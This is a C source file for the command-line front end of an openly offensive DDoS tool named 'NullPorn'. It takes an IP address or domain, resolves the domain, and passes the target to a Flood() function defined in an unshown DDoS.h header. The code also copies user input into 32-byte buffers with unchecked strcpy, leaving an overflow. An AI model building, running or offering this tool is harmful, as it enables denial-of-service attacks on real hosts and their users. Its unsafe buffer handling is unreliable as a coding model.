#include <DDoS.h>

#include <stdio.h>
#include <string.h>
#include <getopt.h>

static void Help()
{
    printf(" _______         __ __ ______                   \n");
    printf("|    |  |.--.--.|  |  |   __ \\.-----.----.-----.\n");
    printf("|       ||  |  ||  |  |    __/|  _  |   _|     |\n");
    printf("|__|____||_____||__|__|___|   |_____|__| |__|__|\n");
    printf("               --- Hachem H. ---                \n");
    printf("\n");
    printf("Usage:\n");
    printf("$ sudo NullPorn -[idh] <arguments>\n");
    printf("Arguments:\n");
    printf("    -i <ip address> : attack an ip.\n");
    printf("    -d <domain>     : attack a domain.\n");
    printf("    -h              : help and usage.\n\n");
}

int main(int argc, char* argv[])
{
    int option = 0;
    while ((option = getopt(argc, argv, "d:i:h"))  != -1)
    {
        switch(option)
        {
        case 'i': 
        {
            char ip[32];
            strcpy(ip, optarg);
            Flood(ip);
            return 0;
        } break;

        case 'd': 
        {
            char domain[32];
            strcpy(domain, optarg);
            char* ip = DNSLookup(domain); 
            Flood(ip);
            free(ip);
            return 0;
        } break;

        case 'h': 
        {
            Help();
            return 0;
        } break;

        default: 
        {
            Help();
            return -1;
        } break;
        }
    }
}
